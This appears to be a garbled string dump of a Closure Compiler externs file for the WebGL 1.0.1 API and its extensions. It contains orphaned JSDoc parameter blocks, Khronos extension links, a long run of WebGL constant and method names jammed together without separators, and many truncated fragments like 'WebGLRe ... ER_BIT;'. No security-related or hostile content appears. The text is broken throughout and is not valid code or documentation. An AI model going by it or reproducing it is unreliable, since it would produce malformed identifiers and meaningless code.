 * @param {number} mask
 * @return {undefined}
 
 * @param {number} face
 * @param {number} mask
 * @return {undefined}
 
 * @param {number} fail
 * @param {number} zfail
 * @param {number} zpass
 * @return {undefined}
 
 * @param {number} face
 * @param {number} fail
 * @param {number} zfail
 * @param {number} zpass
 * @return {undefined}
 
 * @param {number} target
 * @param {number} level
 * @param {number} internalformat
 * @param {number} format or width
 * @param {number} type or height
 * @param {ImageData|HTMLImageElement|HTMLCanvasElement|HTMLVideoElement|
 *     number} img or border
 * @param {number=} opt_format
 * @param {number=} opt_type
 * @param {ArrayBufferView=} opt_pixels
 * @return {undefined}
 
 * @param {number} target
 * @param {number} pname
 * @param {number} param
 * @return {undefined}
 
 * @param {number} target
 * @param {number} level
 * @param {number} xoffset
 * @param {number} yoffset
 * @param {number} format or width
 * @param {number} type or height
 * @param {ImageData|HTMLImageElement|HTMLCanvasElement|HTMLVideoElement|
 *     number} data or format
 * @param {number=} opt_type
 * @param {ArrayBufferView=} opt_pixels
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number} value
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {Float32Array|Array<number>} value
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number|boolean} value
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {Int32Array|Array<number>|Array<boolean>} value
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number} value1
 * @param {number} value2
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number|boolean} value1
 * @param {number|boolean} value2
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number} value1
 * @param {number} value2
 * @param {number} value3
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number|boolean} value1
 * @param {number|boolean} value2
 * @param {number|boolean} value3
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number} value1
 * @param {number} value2
 * @param {number} value3
 * @param {number} value4
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {number|boolean} value1
 * @param {number|boolean} value2
 * @param {number|boolean} value3
 * @param {number|boolean} value4
 * @return {undefined}
 
 * @param {WebGLUniformLocation} location
 * @param {boolean} transpose
 * @param {Float32Array|Array<number>} data
 * @return {undefined}
 
 * @param {number} indx
 * @param {number} x
 * @return {undefined}
 
 * @param {number} indx
 * @param {Float32Array|Array<number>} values
 * @return {undefined}
 
 * @param {number} indx
 * @param {number} x
 * @param {number} y
 * @return {undefined}
 
 * @param {number} indx
 * @param {number} x
 * @param {number} y
 * @param {number} z
 * @return {undefined}
 
 * @param {number} indx
 * @param {number} x
 * @param {number} y
 * @param {number} z
 * @param {number} w
 * @return {undefined}
 
 * @param {number} indx
 * @param {number} size
 * @param {number} type
 * @param {boolean} normalized
 * @param {number} stride
 * @param {number} offset
 * @return {undefined}
 
 * @param {string} eventType
 * @constructor
 * @noalias
 * @extends {Event}
 
 * @constructor
 * @noalias
 * @extends {WebGLObject}
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_texture_float/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_texture_half_float/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/WEBGL_lose_context/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_standard_derivatives/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_vertex_array_object/
 * @constructor
 * @noalias
 * @extends {WebGLObject}
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_vertex_array_object/
 * @constructor
 * @noalias
 
 * @return {WebGLVertexArrayObjectOES}
 * @nosideeffects
 
 * @param {WebGLVertexArrayObjectOES} arrayObject
 * @return {undefined}
 
 * @param {WebGLVertexArrayObjectOES} arrayObject
 * @return {boolean}
 * @nosideeffects
 
 * @see http://www.khronos.org/registry/webgl/extensions/WEBGL_debug_renderer_info/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/WEBGL_debug_shaders/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/WEBGL_compressed_texture_s3tc/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_depth_texture/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/OES_element_index_uint/
 * @constructor
 * @noalias
 
 * @see http://www.khronos.org/registry/webgl/extensions/EXT_texture_filter_anisotropic/
 * @constructor
 * @noalias
 
 * @see https://www.khronos.org/registry/webgl/extensions/WEBGL_draw_buffers/
 * @constructor
 * @noalias
 
 * @param {Array<number>} buffers Draw buffers.
 * @return {undefined}
 
 * @see http://www.khronos.org/registry/webgl/extensions/ANGLE_instanced_arrays/
 * @constructor
 * @noalias
 
 * @param {number} mode Primitive type.
 * @param {number} first First vertex.
 * @param {number} count Number of vertices per instance.
 * @param {number} primcount Number of instances.
 * @return {undefined}
 
 * @param {number} mode Primitive type.
 * @param {number} count Number of vertex indices per instance.
 * @param {number} type Type of a vertex index.
 * @param {number} offset Offset to the first vertex index.
 * @param {number} primcount Number of instances.
 * @return {undefined}
 
 * @param {number} index Attribute index.
 * @param {number} divisor Instance divisor.
 * @return {undefined}
 WebGLRenderingContextDEPTH_BUFFER_BITSTENCIL_BUFFER_BITCOLOR_BUFFER_BITPOINTSLINESLINE_LOOPLINE_STRIPTRIANGLESTRIANGLE_STRIPTRIANGLE_FANZEROONESRC_COLORONE_MINUS_SRC_COLORSRC_ALPHAONE_MINUS_SRC_ALPHADST_ALPHAONE_MINUS_DST_ALPHADST_COLORONE_MINUS_DST_COLORSRC_ALPHA_SATURATEFUNC_ADDBLEND_EQUATIONBLEND_EQUATION_RGBBLEND_EQUATION_ALPHAFUNC_SUBTRACTFUNC_REVERSE_SUBTRACTBLEND_DST_RGBBLEND_SRC_RGBBLEND_DST_ALPHABLEND_SRC_ALPHACONSTANT_COLORONE_MINUS_CONSTANT_COLORCONSTANT_ALPHAONE_MINUS_CONSTANT_ALPHABLEND_COLORARRAY_BUFFERELEMENT_ARRAY_BUFFERARRAY_BUFFER_BINDINGELEMENT_ARRAY_BUFFER_BINDINGSTREAM_DRAWSTATIC_DRAWDYNAMIC_DRAWBUFFER_SIZEBUFFER_USAGECURRENT_VERTEX_ATTRIBFRONTBACKFRONT_AND_BACKCULL_FACEBLENDDITHERSTENCIL_TESTDEPTH_TESTSCISSOR_TESTPOLYGON_OFFSET_FILLSAMPLE_ALPHA_TO_COVERAGESAMPLE_COVERAGENO_ERRORINVALID_ENUMINVALID_VALUEINVALID_OPERATIONOUT_OF_MEMORYCWCCWLINE_WIDTHALIASED_POINT_SIZE_RANGEALIASED_LINE_WIDTH_RANGECULL_FACE_MODEFRONT_FACEDEPTH_RANGEDEPTH_WRITEMASKDEPTH_CLEAR_VALUEDEPTH_FUNCSTENCIL_CLEAR_VALUESTENCIL_FUNCSTENCIL_FAILSTENCIL_PASS_DEPTH_FAILSTENCIL_PASS_DEPTH_PASSSTENCIL_REFSTENCIL_VALUE_MASKSTENCIL_WRITEMASKSTENCIL_BACK_FUNCSTENCIL_BACK_FAILSTENCIL_BACK_PASS_DEPTH_FAILSTENCIL_BACK_PASS_DEPTH_PASSSTENCIL_BACK_REFSTENCIL_BACK_VALUE_MASKSTENCIL_BACK_WRITEMASKVIEWPORTSCISSOR_BOXCOLOR_CLEAR_VALUECOLOR_WRITEMASKUNPACK_ALIGNMENTPACK_ALIGNMENTMAX_TEXTURE_SIZEMAX_VIEWPORT_DIMSSUBPIXEL_BITSRED_BITSGREEN_BITSBLUE_BITSALPHA_BITSDEPTH_BITSSTENCIL_BITSPOLYGON_OFFSET_UNITSPOLYGON_OFFSET_FACTORTEXTURE_BINDING_2DSAMPLE_BUFFERSSAMPLESSAMPLE_COVERAGE_VALUESAMPLE_COVERAGE_INVERTCOMPRESSED_TEXTURE_FORMATSDONT_CAREFASTESTNICESTGENERATE_MIPMAP_HINTBYTEUNSIGNED_BYTESHORTUNSIGNED_SHORTINTUNSIGNED_INTFLOATDEPTH_COMPONENTALPHARGBRGBALUMINANCELUMINANCE_ALPHAUNSIGNED_SHORT_4_4_4_4UNSIGNED_SHORT_5_5_5_1UNSIGNED_SHORT_5_6_5FRAGMENT_SHADERVERTEX_SHADERMAX_VERTEX_ATTRIBSMAX_VERTEX_UNIFORM_VECTORSMAX_VARYING_VECTORSMAX_COMBINED_TEXTURE_IMAGE_UNITSMAX_VERTEX_TEXTURE_IMAGE_UNITSMAX_TEXTURE_IMAGE_UNITSMAX_FRAGMENT_UNIFORM_VECTORSSHADER_TYPEDELETE_STATUSLINK_STATUSVALIDATE_STATUSATTACHED_SHADERSACTIVE_UNIFORMSACTIVE_ATTRIBUTESSHADING_LANGUAGE_VERSIONCURRENT_PROGRAMNEVERLESSEQUALLEQUALGREATERNOTEQUALGEQUALALWAYSKEEPREPLACEINCRDECRINVERTINCR_WRAPDECR_WRAPVENDORRENDERERVERSIONNEARESTLINEARNEAREST_MIPMAP_NEARESTLINEAR_MIPMAP_NEARESTNEAREST_MIPMAP_LINEARLINEAR_MIPMAP_LINEARTEXTURE_MAG_FILTERTEXTURE_MIN_FILTERTEXTURE_WRAP_STEXTURE_WRAP_TTEXTURE_2DTEXTURETEXTURE_CUBE_MAPTEXTURE_BINDING_CUBE_MAPTEXTURE_CUBE_MAP_POSITIVE_XTEXTURE_CUBE_MAP_NEGATIVE_XTEXTURE_CUBE_MAP_POSITIVE_YTEXTURE_CUBE_MAP_NEGATIVE_YTEXTURE_CUBE_MAP_POSITIVE_ZTEXTURE_CUBE_MAP_NEGATIVE_ZMAX_CUBE_MAP_TEXTURE_SIZETEXTURE0TEXTURE1TEXTURE2TEXTURE3TEXTURE4TEXTURE5TEXTURE6TEXTURE7TEXTURE8TEXTURE9TEXTURE10TEXTURE11TEXTURE12TEXTURE13TEXTURE14TEXTURE15TEXTURE16TEXTURE17TEXTURE18TEXTURE19TEXTURE20TEXTURE21TEXTURE22TEXTURE23TEXTURE24TEXTURE25TEXTURE26TEXTURE27TEXTURE28TEXTURE29TEXTURE30TEXTURE31ACTIVE_TEXTUREREPEATCLAMP_TO_EDGEMIRRORED_REPEATFLOAT_VEC2FLOAT_VEC3FLOAT_VEC4INT_VEC2INT_VEC3INT_VEC4BOOLBOOL_VEC2BOOL_VEC3BOOL_VEC4FLOAT_MAT2FLOAT_MAT3FLOAT_MAT4SAMPLER_2DSAMPLER_CUBEVERTEX_ATTRIB_ARRAY_ENABLEDVERTEX_ATTRIB_ARRAY_SIZEVERTEX_ATTRIB_ARRAY_STRIDEVERTEX_ATTRIB_ARRAY_TYPEVERTEX_ATTRIB_ARRAY_NORMALIZEDVERTEX_ATTRIB_ARRAY_POINTERVERTEX_ATTRIB_ARRAY_BUFFER_BINDINGIMPLEMENTATION_COLOR_READ_FORMATIMPLEMENTATION_COLOR_READ_TYPECOMPILE_STATUSLOW_FLOATMEDIUM_FLOATHIGH_FLOATLOW_INTMEDIUM_INTHIGH_INTFRAMEBUFFERRENDERBUFFERRGBA4RGB5_A1RGB565DEPTH_COMPONENT16STENCIL_INDEXSTENCIL_INDEX8DEPTH_STENCILRENDERBUFFER_WIDTHRENDERBUFFER_HEIGHTRENDERBUFFER_INTERNAL_FORMATRENDERBUFFER_RED_SIZERENDERBUFFER_GREEN_SIZERENDERBUFFER_BLUE_SIZERENDERBUFFER_ALPHA_SIZERENDERBUFFER_DEPTH_SIZERENDERBUFFER_STENCIL_SIZEFRAMEBUFFER_ATTACHMENT_OBJECT_TYPEFRAMEBUFFER_ATTACHMENT_OBJECT_NAMEFRAMEBUFFER_ATTACHMENT_TEXTURE_LEVELFRAMEBUFFER_ATTACHMENT_TEXTURE_CUBE_MAP_FACECOLOR_ATTACHMENT0DEPTH_ATTACHMENTSTENCIL_ATTACHMENTDEPTH_STENCIL_ATTACHMENTNONEFRAMEBUFFER_COMPLETEFRAMEBUFFER_INCOMPLETE_ATTACHMENTFRAMEBUFFER_INCOMPLETE_MISSING_ATTACHMENTFRAMEBUFFER_INCOMPLETE_DIMENSIONSFRAMEBUFFER_UNSUPPORTEDFRAMEBUFFER_BINDINGRENDERBUFFER_BINDINGMAX_RENDERBUFFER_SIZEINVALID_FRAMEBUFFER_OPERATIONUNPACK_FLIP_Y_WEBGLUNPACK_PREMULTIPLY_ALPHA_WEBGLCONTEXT_LOST_WEBGLUNPACK_COLORSPACE_CONVERSION_WEBGLBROWSER_DEFAULT_WEBGLdrawingBufferWidthdrawingBufferHeightgetContextAttributesisContextLostgetSupportedExtensionsgetExtensionactiveTexturetextureattachShaderprogramshaderbindAttribLocationbindBufferbindFramebufferbindRenderbufferbindTextureblendColorblendEquationblendEquationSeparatemodeRGBmodeAlphablendFuncsfactordfactorblendFuncSeparatesrcRGBdstRGBsrcAlphadstAlphabufferDatabufferSubDatacheckFramebufferStatusclearColorclearDepthclearStencilcolorMaskcompileShadercompressedTexImage2DinternalformatcompressedTexSubImage2DxoffsetyoffsetcopyTexImage2DcopyTexSubImage2DcreateBuffercreateFramebuffercreateProgramcreateRenderbuffercreateShadercreateTexturecullFacedeleteBufferdeleteFramebufferdeleteProgramdeleteRenderbufferdeleteShaderdeleteTexturedepthFuncdepthMaskdepthRangenearValfarValdetachShaderdisableVertexAttribArraydrawArraysdrawElementscapenableVertexAttribArrayfinishframebufferRenderbufferattachmentrenderbuffertargetrenderbufferframebufferTexture2DtextargetfrontFacegenerateMipmapgetActiveAttribgetActiveUniformgetAttachedShadersgetAttribLocationgetBufferParameterpnamegetErrorgetFramebufferAttachmentParametergetProgramParametergetProgramInfoLoggetRenderbufferParametergetShaderParametergetShaderPrecisionFormatshadertypeprecisiontypegetShaderInfoLoggetShaderSourcegetTexParametergetUniformgetUniformLocationgetVertexAttribgetVertexAttribOffsethintisEnabledisFramebufferframebufferisProgramisRenderbufferisShaderisTexturelinkProgrampixelStoreipolygonOffsetfactorunitsreadPixelspixelsrenderbufferStoragesampleCoveragecoveragescissorshaderSourcestencilFuncstencilFuncSeparatestencilMaskstencilMaskSeparatestencilOpzfailzpassstencilOpSeparatetexImage2Dopt_pixelstexParameterftexParameteritexSubImage2Duniform1funiform1fvuniform1iuniform1ivuniform2funiform2fvuniform2iuniform2ivuniform3fvalue3uniform3fvuniform3iuniform3ivuniform4fvalue4uniform4fvuniform4iuniform4ivuniformMatrix2fvtransposeuniformMatrix3fvuniformMatrix4fvuseProgramvalidateProgramvertexAttrib1findxvertexAttrib1fvvertexAttrib2fvertexAttrib2fvvertexAttrib3fvertexAttrib3fvvertexAttrib4fvertexAttrib4fvvertexAttribPointernormalizedstrideviewportWebGLContextAttributesstencilantialiaspremultipliedAlphapreserveDrawingBufferpreferLowPowerToHighPerformancefailIfMajorPerformanceCaveatWebGLContextEventWebGLShaderPrecisionFormatrangeMinrangeMaxprecisionWebGLObjectWebGLBufferWebGLFramebufferWebGLProgramWebGLRenderbufferWebGLShaderWebGLTextureWebGLActiveInfoWebGLUniformLocationOES_texture_floatOES_texture_half_floatHALF_FLOAT_OESWEBGL_lose_contextloseContextrestoreContextOES_standard_derivativesFRAGMENT_SHADER_DERIVATIVE_HINT_OESWebGLVertexArrayObjectOESOES_vertex_array_objectVERTEX_ARRAY_BINDING_OEScreateVertexArrayOESdeleteVertexArrayOESarrayObjectisVertexArrayOESbindVertexArrayOESWEBGL_debug_renderer_infoUNMASKED_VENDOR_WEBGLUNMASKED_RENDERER_WEBGLWEBGL_debug_shadersgetTranslatedShaderSourceWEBGL_compressed_texture_s3tcCOMPRESSED_RGB_S3TC_DXT1_EXTCOMPRESSED_RGBA_S3TC_DXT1_EXTCOMPRESSED_RGBA_S3TC_DXT3_EXTCOMPRESSED_RGBA_S3TC_DXT5_EXTOES_depth_textureOES_element_index_uintEXT_texture_filter_anisotropicTEXTURE_MAX_ANISOTROPY_EXTMAX_TEXTURE_MAX_ANISOTROPY_EXTWEBGL_draw_buffersCOLOR_ATTACHMENT0_WEBGLCOLOR_ATTACHMENT1_WEBGLCOLOR_ATTACHMENT2_WEBGLCOLOR_ATTACHMENT3_WEBGLCOLOR_ATTACHMENT4_WEBGLCOLOR_ATTACHMENT5_WEBGLCOLOR_ATTACHMENT6_WEBGLCOLOR_ATTACHMENT7_WEBGLCOLOR_ATTACHMENT8_WEBGLCOLOR_ATTACHMENT9_WEBGLCOLOR_ATTACHMENT10_WEBGLCOLOR_ATTACHMENT11_WEBGLCOLOR_ATTACHMENT12_WEBGLCOLOR_ATTACHMENT13_WEBGLCOLOR_ATTACHMENT14_WEBGLCOLOR_ATTACHMENT15_WEBGLDRAW_BUFFER0_WEBGLDRAW_BUFFER1_WEBGLDRAW_BUFFER2_WEBGLDRAW_BUFFER3_WEBGLDRAW_BUFFER4_WEBGLDRAW_BUFFER5_WEBGLDRAW_BUFFER6_WEBGLDRAW_BUFFER7_WEBGLDRAW_BUFFER8_WEBGLDRAW_BUFFER9_WEBGLDRAW_BUFFER10_WEBGLDRAW_BUFFER11_WEBGLDRAW_BUFFER12_WEBGLDRAW_BUFFER13_WEBGLDRAW_BUFFER14_WEBGLDRAW_BUFFER15_WEBGLMAX_COLOR_ATTACHMENTS_WEBGLMAX_DRAW_BUFFERS_WEBGLdrawBuffersWEBGLbuffersANGLE_instanced_arraysVERTEX_ATTRIB_ARRAY_DIVISOR_ANGLEdrawArraysInstancedANGLEprimcountdrawElementsInstancedANGLEvertexAttribDivisorANGLEdivisorDefinitions for WebGL functions as described at
http://www.khronos.org/registry/webgl/specs/latest/
* This file is current up to the WebGL 1.0.1 spec, including extensions.
* This relies on html5.js being included for Canvas and Typed Array support.
* This includes some extensions defined at
http://www.khronos.org/registry/webgl/extensions/
*!WebGLContextAttributesNote that this has side effects by enabling the extension even if the
result is not used.(ArrayBufferView|ArrayBuffer|number)(ArrayBufferView|ArrayBuffer)!WebGLBuffer!WebGLFramebuffer!WebGLProgram!WebGLRenderbuffer!WebGLShader!WebGLTexture!Array.<WebGLShader>Array.<WebGLShader>or width
or height
or border
(ImageData|HTMLImageElement|HTMLCanvasElement|HTMLVideoElement|number)ArrayBufferView=or format
(Float32Array|Array.<number>)(number|boolean)(Int32Array|Array.<number>|Array.<boolean>)http://www.khronos.org/registry/webgl/extensions/OES_texture_float/
http://www.khronos.org/registry/webgl/extensions/OES_texture_half_float/
http://www.khronos.org/registry/webgl/extensions/WEBGL_lose_context/
http://www.khronos.org/registry/webgl/extensions/OES_standard_derivatives/
http://www.khronos.org/registry/webgl/extensions/OES_vertex_array_object/
http://www.khronos.org/registry/webgl/extensions/WEBGL_debug_renderer_info/
http://www.khronos.org/registry/webgl/extensions/WEBGL_debug_shaders/
http://www.khronos.org/registry/webgl/extensions/WEBGL_compressed_texture_s3tc/
http://www.khronos.org/registry/webgl/extensions/OES_depth_texture/
http://www.khronos.org/registry/webgl/extensions/OES_element_index_uint/
http://www.khronos.org/registry/webgl/extensions/EXT_texture_filter_anisotropic/
https://www.khronos.org/registry/webgl/extensions/WEBGL_draw_buffers/
Draw buffers.
http://www.khronos.org/registry/webgl/extensions/ANGLE_instanced_arrays/
Primitive type.
First vertex.
Number of vertices per instance.
Number of instances.
Number of vertex indices per instance.
Type of a vertex index.
Offset to the first vertex index.
Attribute index.
Instance divisor.
functio ... xt() {}WebGLRe ... ContextWebGLRe ... ER_BIT;WebGLRe ... FER_BITWebGLRe ... POINTS;WebGLRe ... .POINTSWebGLRe ... .LINES;WebGLRe ... t.LINESWebGLRe ... E_LOOP;WebGLRe ... NE_LOOPWebGLRe ... _STRIP;WebGLRe ... E_STRIPWebGLRe ... ANGLES;WebGLRe ... IANGLESWebGLRe ... LE_FAN;WebGLRe ... GLE_FANWebGLRe ... t.ZERO;WebGLRe ... xt.ZEROWebGLRe ... xt.ONE;WebGLRe ... ext.ONEWebGLRe ... _COLOR;WebGLRe ... C_COLORWebGLRe ... _ALPHA;WebGLRe ... C_ALPHAWebGLRe ... T_ALPHAWebGLRe ... T_COLORWebGLRe ... TURATE;WebGLRe ... ATURATEWebGLRe ... NC_ADD;WebGLRe ... UNC_ADDWebGLRe ... UATION;WebGLRe ... QUATIONWebGLRe ... ON_RGB;WebGLRe ... ION_RGBWebGLRe ... N_ALPHAWebGLRe ... BTRACT;WebGLRe ... UBTRACTFUNC_RE ... UBTRACTWebGLRe ... ST_RGB;WebGLRe ... DST_RGBWebGLRe ... RC_RGB;WebGLRe ... SRC_RGBONE_MIN ... T_COLORONE_MIN ... T_ALPHAWebGLRe ... D_COLORWebGLRe ... BUFFER;WebGLRe ... _BUFFERWebGLRe ... INDING;WebGLRe ... BINDINGELEMENT ... BINDINGWebGLRe ... M_DRAW;WebGLRe ... AM_DRAWWebGLRe ... C_DRAW;WebGLRe ... IC_DRAWWebGLRe ... R_SIZE;WebGLRe ... ER_SIZEWebGLRe ... _USAGE;WebGLRe ... R_USAGEWebGLRe ... ATTRIB;WebGLRe ... _ATTRIBCURRENT ... _ATTRIBWebGLRe ... .FRONT;WebGLRe ... t.FRONTWebGLRe ... t.BACK;WebGLRe ... xt.BACKWebGLRe ... D_BACK;WebGLRe ... ND_BACKWebGLRe ... L_FACE;WebGLRe ... LL_FACEWebGLRe ... .BLEND;WebGLRe ... t.BLENDWebGLRe ... DITHER;WebGLRe ... .DITHERWebGLRe ... L_TEST;WebGLRe ... IL_TESTWebGLRe ... H_TEST;WebGLRe ... TH_TESTWebGLRe ... R_TEST;WebGLRe ... OR_TESTWebGLRe ... T_FILL;WebGLRe ... ET_FILLWebGLRe ... VERAGE;WebGLRe ... OVERAGESAMPLE_ ... OVERAGEWebGLRe ... _ERROR;WebGLRe ... O_ERRORWebGLRe ... D_ENUM;WebGLRe ... ID_ENUMWebGLRe ... _VALUE;WebGLRe ... D_VALUEWebGLRe ... RATION;WebGLRe ... ERATIONWebGLRe ... MEMORY;WebGLRe ... _MEMORYWebGLRe ... ext.CW;WebGLRe ... text.CWWebGLRe ... xt.CCW;WebGLRe ... ext.CCWWebGLRe ... _WIDTH;WebGLRe ... E_WIDTHWebGLRe ... _RANGE;WebGLRe ... E_RANGEALIASED ... E_RANGEWebGLRe ... H_RANGEALIASED ... H_RANGEWebGLRe ... E_MODE;WebGLRe ... CE_MODEWebGLRe ... T_FACE;WebGLRe ... NT_FACEWebGLRe ... TEMASK;WebGLRe ... ITEMASKWebGLRe ... R_VALUEWebGLRe ... H_FUNC;WebGLRe ... TH_FUNCWebGLRe ... L_FUNC;WebGLRe ... IL_FUNCWebGLRe ... L_FAIL;WebGLRe ... IL_FAILWebGLRe ... H_FAIL;WebGLRe ... TH_FAILSTENCIL ... TH_FAILWebGLRe ... H_PASS;WebGLRe ... TH_PASSSTENCIL ... TH_PASSWebGLRe ... IL_REF;WebGLRe ... CIL_REFWebGLRe ... E_MASK;WebGLRe ... UE_MASKWebGLRe ... K_FUNC;WebGLRe ... CK_FUNCWebGLRe ... K_FAIL;WebGLRe ... CK_FAILWebGLRe ... CK_REF;WebGLRe ... ACK_REFSTENCIL ... UE_MASKSTENCIL ... ITEMASKWebGLRe ... EWPORT;WebGLRe ... IEWPORTWebGLRe ... OR_BOX;WebGLRe ... SOR_BOXWebGLRe ... GNMENT;WebGLRe ... IGNMENTWebGLRe ... E_SIZE;WebGLRe ... RE_SIZEWebGLRe ... T_DIMS;WebGLRe ... RT_DIMSWebGLRe ... L_BITS;WebGLRe ... EL_BITSWebGLRe ... D_BITS;WebGLRe ... ED_BITSWebGLRe ... N_BITS;WebGLRe ... EN_BITSWebGLRe ... E_BITS;WebGLRe ... UE_BITSWebGLRe ... A_BITS;WebGLRe ... HA_BITSWebGLRe ... H_BITS;WebGLRe ... TH_BITSWebGLRe ... IL_BITSWebGLRe ... _UNITS;WebGLRe ... T_UNITSWebGLRe ... FACTOR;WebGLRe ... _FACTORPOLYGON ... _FACTORWebGLRe ... ING_2D;WebGLRe ... DING_2DWebGLRe ... UFFERS;WebGLRe ... BUFFERSWebGLRe ... AMPLES;WebGLRe ... SAMPLESWebGLRe ... E_VALUESAMPLE_ ... E_VALUEWebGLRe ... INVERT;WebGLRe ... _INVERTSAMPLE_ ... _INVERTWebGLRe ... ORMATS;WebGLRe ... FORMATSCOMPRES ... FORMATSWebGLRe ... T_CARE;WebGLRe ... NT_CAREWebGLRe ... ASTEST;WebGLRe ... FASTESTWebGLRe ... NICEST;WebGLRe ... .NICESTWebGLRe ... P_HINT;WebGLRe ... AP_HINTWebGLRe ... t.BYTE;WebGLRe ... xt.BYTEWebGLRe ... D_BYTE;WebGLRe ... ED_BYTEWebGLRe ... .SHORT;WebGLRe ... t.SHORTWebGLRe ... _SHORT;WebGLRe ... D_SHORTWebGLRe ... xt.INT;WebGLRe ... ext.INTWebGLRe ... ED_INT;WebGLRe ... NED_INTWebGLRe ... .FLOAT;WebGLRe ... t.FLOATWebGLRe ... PONENT;WebGLRe ... MPONENTWebGLRe ... .ALPHA;WebGLRe ... t.ALPHAWebGLRe ... xt.RGB;WebGLRe ... ext.RGBWebGLRe ... t.RGBA;WebGLRe ... xt.RGBAWebGLRe ... INANCE;WebGLRe ... MINANCEWebGLRe ... E_ALPHAWebGLRe ... _4_4_4;WebGLRe ... 4_4_4_4UNSIGNE ... 4_4_4_4WebGLRe ... _5_5_1;WebGLRe ... 5_5_5_1UNSIGNE ... 5_5_5_1WebGLRe ... _5_6_5;WebGLRe ... T_5_6_5WebGLRe ... SHADER;WebGLRe ... _SHADERWebGLRe ... TTRIBS;WebGLRe ... ATTRIBSWebGLRe ... ECTORS;WebGLRe ... VECTORSMAX_VER ... VECTORSWebGLRe ... E_UNITSMAX_COM ... E_UNITSMAX_VER ... E_UNITSMAX_TEX ... E_UNITSMAX_FRA ... VECTORSWebGLRe ... R_TYPE;WebGLRe ... ER_TYPEWebGLRe ... STATUS;WebGLRe ... _STATUSWebGLRe ... HADERS;WebGLRe ... SHADERSWebGLRe ... IFORMS;WebGLRe ... NIFORMSWebGLRe ... IBUTES;WebGLRe ... RIBUTESWebGLRe ... ERSION;WebGLRe ... VERSIONSHADING ... VERSIONWebGLRe ... ROGRAM;WebGLRe ... PROGRAMWebGLRe ... .NEVER;WebGLRe ... t.NEVERWebGLRe ... t.LESS;WebGLRe ... xt.LESSWebGLRe ... .EQUAL;WebGLRe ... t.EQUALWebGLRe ... LEQUAL;WebGLRe ... .LEQUALWebGLRe ... REATER;WebGLRe ... GREATERWebGLRe ... TEQUAL;WebGLRe ... OTEQUALWebGLRe ... GEQUAL;WebGLRe ... .GEQUALWebGLRe ... ALWAYS;WebGLRe ... .ALWAYSWebGLRe ... t.KEEP;WebGLRe ... xt.KEEPWebGLRe ... EPLACE;WebGLRe ... REPLACEWebGLRe ... t.INCR;WebGLRe ... xt.INCRWebGLRe ... t.DECR;WebGLRe ... xt.DECRWebGLRe ... .INVERTWebGLRe ... R_WRAP;WebGLRe ... CR_WRAPWebGLRe ... VENDOR;WebGLRe ... .VENDORWebGLRe ... NDERER;WebGLRe ... ENDERERWebGLRe ... EAREST;WebGLRe ... NEARESTWebGLRe ... LINEAR;WebGLRe ... .LINEARNEAREST ... NEARESTLINEAR_ ... NEARESTWebGLRe ... _LINEARNEAREST ... _LINEARWebGLRe ... FILTER;WebGLRe ... _FILTERWebGLRe ... WRAP_S;WebGLRe ... _WRAP_SWebGLRe ... WRAP_T;WebGLRe ... _WRAP_TWebGLRe ... URE_2D;WebGLRe ... TURE_2DWebGLRe ... EXTURE;WebGLRe ... TEXTUREWebGLRe ... BE_MAP;WebGLRe ... UBE_MAPTEXTURE ... UBE_MAPWebGLRe ... TIVE_X;WebGLRe ... ITIVE_XTEXTURE ... ITIVE_XWebGLRe ... ATIVE_XTEXTURE ... ATIVE_XWebGLRe ... TIVE_Y;WebGLRe ... ITIVE_YTEXTURE ... ITIVE_YWebGLRe ... ATIVE_YTEXTURE ... ATIVE_YWebGLRe ... TIVE_Z;WebGLRe ... ITIVE_ZTEXTURE ... ITIVE_ZWebGLRe ... ATIVE_ZTEXTURE ... ATIVE_ZMAX_CUB ... RE_SIZEWebGLRe ... XTURE0;WebGLRe ... EXTURE0WebGLRe ... XTURE1;WebGLRe ... EXTURE1WebGLRe ... XTURE2;WebGLRe ... EXTURE2WebGLRe ... XTURE3;WebGLRe ... EXTURE3WebGLRe ... XTURE4;WebGLRe ... EXTURE4WebGLRe ... XTURE5;WebGLRe ... EXTURE5WebGLRe ... XTURE6;WebGLRe ... EXTURE6WebGLRe ... XTURE7;WebGLRe ... EXTURE7WebGLRe ... XTURE8;WebGLRe ... EXTURE8WebGLRe ... XTURE9;WebGLRe ... EXTURE9WebGLRe ... TURE10;WebGLRe ... XTURE10WebGLRe ... TURE11;WebGLRe ... XTURE11WebGLRe ... TURE12;WebGLRe ... XTURE12WebGLRe ... TURE13;WebGLRe ... XTURE13WebGLRe ... TURE14;WebGLRe ... XTURE14WebGLRe ... TURE15;WebGLRe ... XTURE15WebGLRe ... TURE16;WebGLRe ... XTURE16WebGLRe ... TURE17;WebGLRe ... XTURE17WebGLRe ... TURE18;WebGLRe ... XTURE18WebGLRe ... TURE19;WebGLRe ... XTURE19WebGLRe ... TURE20;WebGLRe ... XTURE20WebGLRe ... TURE21;WebGLRe ... XTURE21WebGLRe ... TURE22;WebGLRe ... XTURE22WebGLRe ... TURE23;WebGLRe ... XTURE23WebGLRe ... TURE24;WebGLRe ... XTURE24WebGLRe ... TURE25;WebGLRe ... XTURE25WebGLRe ... TURE26;WebGLRe ... XTURE26WebGLRe ... TURE27;WebGLRe ... XTURE27WebGLRe ... TURE28;WebGLRe ... XTURE28WebGLRe ... TURE29;WebGLRe ... 